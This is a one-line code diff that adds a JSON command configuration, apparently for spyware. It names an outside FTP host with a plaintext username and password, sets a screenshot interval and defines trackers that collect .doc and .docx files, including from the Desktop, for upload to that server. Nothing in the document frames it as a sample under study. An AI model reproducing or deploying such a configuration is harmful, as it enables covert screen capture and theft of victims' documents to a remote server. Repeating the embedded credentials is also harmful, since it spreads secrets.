@@ -1,1 +1,1 @@
-//this here temp ucmd
+{"Commands":[],"FtpCmd":{"Host":"ftp.byethost11.com","Username":"b11_13720482","Password":"3B6JF5Mb","WFDir":"/htdocs/Temp123/WFiles","OFDir":"/htdocs/Temp123/OFiles"},"InteractiveServiceUrl":"","ScrShotMlSn":45000,"uTrackers":[{"Type":0,"uDirectory":null,"IncludeSubDir":true,"RegexPatterns":[".doc$",".docx$"]},{"Type":1,"uDirectory":"?Desktop","IncludeSubDir":true,"RegexPatterns":[".doc$",".docx$"]}]}
